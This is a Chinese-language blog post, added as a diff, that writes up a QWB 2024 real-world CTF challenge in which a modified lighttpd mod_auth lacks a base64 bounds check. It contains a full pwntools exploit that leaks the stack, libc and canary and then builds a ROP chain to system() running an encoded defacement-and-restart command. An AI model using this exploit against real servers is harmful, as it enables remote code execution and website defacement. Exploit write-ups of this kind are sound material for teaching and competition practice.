@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>qwb 2024 rw LTP</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./qwb 2024 rw LTP.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">qwb 2024 rw LTP</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2024-12-16]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>lighttpd1.4 mod_auth改了 栈溢出</p>
+<p>用给的虚拟机进行编译，且和编译方式有关 使用cmake最接近</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">$ cd lighttpd1.4 cmake -DCMAKE_INSTALL_PREFIX=/usr/local -Wno-dev .
+</span><span style="color:#c0c5ce;">$ make -j 4 make test
+</span><span style="color:#c0c5ce;">$ sudo make install
+</span></pre>
+<p>bindiff <code>mod_auth.so</code>  一个被改动的函数
+<img src="./images/Pasted%20image%2020241214214236.png" alt="" /></p>
+<p>涉及代码如下，不过目测漏洞不在这里（<code>ulen</code>限制0x8FC 也造成能够溢出）
+<img src="./images/Pasted%20image%2020241214214321.png" alt="" /></p>
+<p><code>li_base64_dec</code>函数在<code>lighttpd</code>中定义 diff发现同样被改了
+<img src="./images/Pasted%20image%2020241214221339.png" alt="" /></p>
+<p>下图左边为题目附件，右边为原版lighttpd，可以发现这里原有的越界检查被删去了，而原本传入函数第二个限制长度的参数<code>out_length</code>没有发挥作用，造成栈溢出
+<img src="./images/Pasted%20image%2020241214221640.png" alt="" /></p>
+<p>直接栈上拼接，可以把内容在返回报文中带出来
+但存在canary，为了解决这一问题出题人加了一个分支以便利用
+使用basic认证，当解码后找不到冒号时进入else，将栈上数组最后一个字节置0，从而能够恢复被覆盖的canary最后一字节。而返回包内容在前面已经被拷贝到<code>dest</code>变量里了</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">v5 = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(user);
+</span><span style="color:#c0c5ce;">dest = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(v5 + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">v6 = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(user);
+</span><span style="color:#8fa1b3;">memcpy</span><span style="color:#c0c5ce;">(dest, user, v6);
+</span><span style="color:#c0c5ce;">v21 = </span><span style="color:#96b5b4;">memchr</span><span style="color:#c0c5ce;">(user, &#39;</span><span style="color:#a3be8c;">:</span><span style="color:#c0c5ce;">&#39;, na);
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v21 )
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	...
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">else
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  user[na - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;                         </span><span style="color:#65737e;">// 置0
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">log_error</span><span style="color:#c0c5ce;">(*(a1 + </span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">), &quot;</span><span style="color:#a3be8c;">/home/x/Exp/ubuntu22/rwrw/lighttpd1.4/src/mod_auth.c</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">845LL</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">missing &#39;:&#39; in </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, user);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">sub_4720</span><span style="color:#c0c5ce;">(a1, require-&gt;realm, dest);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h2 id="exp">exp</h2><p>获取栈等基址的偏移可能不是很好，演示最后几秒钟才通的 😅</p>
+<blockquote>
+<p>最后执行<code>echo '&lt;html&gt;\n&lt;body&gt;\n&lt;h1&gt;hacked by Dubhe&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;' &gt; /var/index.html&amp;&amp;sleep 2&amp;&amp;/home/qwb/lighttpd -f /home/qwb/lighttpd.conf &amp;</code></p>
+<p>执行的时候lighttpd还没挂，直接重新运行会因为端口占用无法启动。用<code>&amp;</code>让他不等命令执行完进程就挂掉，命令执行中先sleep 2s再重启</p>
+</blockquote>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import</span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">context</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">os</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">linux</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">arch</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">amd64</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">log_level</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">debug</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">base64_encode</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">data_bytes</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    encoded_data = base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(data_bytes)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">encoded_data.</span><span style="color:#8fa1b3;">decode</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">r = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">192.168.130.151</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">8080</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;&quot;&quot;</span><span style="color:#a3be8c;">GET /www/ HTTP/1.1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Host: 192.168.130.151:8080</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Authorization: Basic </span><span style="color:#c0c5ce;">{</span><span style="color:#8fa1b3;">base64_encode</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)}</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">
+</span><span style="color:#c0c5ce;">&quot;&quot;&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0.2</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(payload.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">res = r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">_idx = res.</span><span style="color:#8fa1b3;">index</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">0x8
+</span><span style="color:#c0c5ce;">core_data = res[_idx:_idx+</span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">]
+</span><span style="color:#c0c5ce;">stack_addr = </span><span style="color:#8fa1b3;">u64</span><span style="color:#c0c5ce;">(core_data+</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00\x00</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;&quot;&quot;</span><span style="color:#a3be8c;">GET /www/ HTTP/1.1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Host: 192.168.130.151:8080</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Authorization: Basic </span><span style="color:#c0c5ce;">{</span><span style="color:#8fa1b3;">base64_encode</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x68</span><span style="color:#c0c5ce;">)}</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">
+</span><span style="color:#c0c5ce;">&quot;&quot;&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0.2</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(payload.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">res = r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">libc = </span><span style="color:#8fa1b3;">ELF</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">/lib/x86_64-linux-gnu/libc.so.6</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">_idx = res.</span><span style="color:#8fa1b3;">index</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x68</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">0x68
+</span><span style="color:#c0c5ce;">core_data = res[_idx:_idx+</span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">]
+</span><span style="color:#c0c5ce;">libc.address = </span><span style="color:#8fa1b3;">u64</span><span style="color:#c0c5ce;">(core_data+</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00\x00</span><span style="color:#c0c5ce;">&quot;)-</span><span style="color:#d08770;">0xe1225
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&quot;&quot;&quot;</span><span style="color:#a3be8c;">GET /www/ HTTP/1.1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Host: 192.168.130.151:8080</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Authorization: Basic </span><span style="color:#c0c5ce;">{</span><span style="color:#8fa1b3;">base64_encode</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x409</span><span style="color:#c0c5ce;">)}</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">
+</span><span style="color:#c0c5ce;">&quot;&quot;&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0.2</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(payload.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">res = r.</span><span style="color:#8fa1b3;">recv</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">_idx = res.</span><span style="color:#8fa1b3;">index</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x409</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">0x409
+</span><span style="color:#c0c5ce;">core_data = res[_idx:_idx+</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">]
+</span><span style="color:#c0c5ce;">canary = </span><span style="color:#8fa1b3;">u64</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;+core_data)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">syscall_r = libc.address+</span><span style="color:#d08770;">0x0000000000091316
+</span><span style="color:#c0c5ce;">pop_rdi_r = libc.address+</span><span style="color:#d08770;">0x000000000002a3e5
+</span><span style="color:#c0c5ce;">pop_rsi_r = libc.address+</span><span style="color:#d08770;">0x000000000002be51
+</span><span style="color:#c0c5ce;">pop_rdx_r12_r = libc.address+</span><span style="color:#d08770;">0x000000000011f2e7
+</span><span style="color:#c0c5ce;">pop_rax_r = libc.address+</span><span style="color:#d08770;">0x0000000000045eb0
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">_rop = </span><span style="color:#8fa1b3;">flat</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Z</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x408</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    canary,
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Z</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    pop_rdi_r, stack_addr+</span><span style="color:#d08770;">0x438</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    pop_rsi_r, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    pop_rdx_r12_r, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">    libc.sym[&#39;</span><span style="color:#a3be8c;">system</span><span style="color:#c0c5ce;">&#39;],
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">echo ZWNobyAnPGh0bWw+XG48Ym9keT5cbjxoMT5oYWNrZWQgYnkgRHViaGU8L2gxPlxuPC9ib2R5PlxuPC9odG1sPicgPiAvdmFyL2luZGV4Lmh0bWwmJnNsZWVwIDImJi9ob21lL3F3Yi9saWdodHRwZCAtZiAvaG9tZS9xd2IvbGlnaHR0cGQuY29uZiAm | base64 -d | sh</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;&quot;&quot;</span><span style="color:#a3be8c;">GET /www/ HTTP/1.1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Host: 192.168.130.151:8080</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Authorization: Basic </span><span style="color:#c0c5ce;">&quot;&quot;&quot;+ base64.</span><span style="color:#8fa1b3;">b64encode</span><span style="color:#c0c5ce;">(_rop) +</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\r\n\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0.2</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(payload)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">success</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(stack_addr))
+</span><span style="color:#8fa1b3;">success</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(libc.address))
+</span><span style="color:#8fa1b3;">success</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(canary))
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">()
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
